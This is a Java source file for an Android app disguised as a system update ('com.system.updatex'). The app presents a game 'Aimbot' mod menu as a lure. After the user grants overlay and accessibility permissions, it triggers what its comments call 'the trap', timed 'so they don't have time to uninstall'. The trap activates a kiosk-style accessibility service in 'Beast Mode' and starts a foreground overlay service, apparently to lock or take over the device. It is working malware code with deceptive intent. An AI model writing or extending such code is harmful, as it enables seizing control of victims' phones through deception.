package com.system.updatex;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {

    private WebView webView;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isActivated = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webview);
        
        // Setup WebView to run the HTML Mod Menu
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("file:///android_asset/index.html");
        
        // Connect the HTML buttons to the Java backend
        webView.addJavascriptInterface(new WebAppInterface(this, this), "Android");
    }

    @Override
    protected void onResume() {
        super.onResume();
        
        // This runs every time the user returns from the Settings app.
        // If they just granted both permissions, and the toggle is ON, we auto-fire the trap.
        if (!isActivated && Settings.canDrawOverlays(this) && isAccessibilityEnabled()) {
            
            // Ask the HTML: "Is the Aimbot toggle checked?"
            webView.evaluateJavascript("(function() { return document.getElementById('toggle-aimbot').checked; })();", value -> {
                if ("true".equals(value)) {
                    // If yes, instantly start the trap so they don't have time to uninstall!
                    startInjectionSequence();
                }
            });
        }
    }

    private boolean isAccessibilityEnabled() {
        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices == null) return false;
        String component = getPackageName() + "/" + KioskAccessibilityService.class.getName();
        return enabledServices.toLowerCase().contains(component.toLowerCase());
    }

    // This is called by WebAppInterface.java when the user clicks "INITIALIZE SYSTEM"
    public void startInjectionSequence() {
        if (isActivated) return;
        isActivated = true;

        // CRITICAL: Tell the Accessibility Service to go into "Beast Mode"
        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_activated", true).commit();

        runOnUiThread(() -> {
            try {
                Intent serviceIntent = new Intent(MainActivity.this, OverlayService.class);
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
                
                // Wait 1 second before closing the Mod Menu so the Service has time to start
                handler.postDelayed(this::finish, 1000);
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
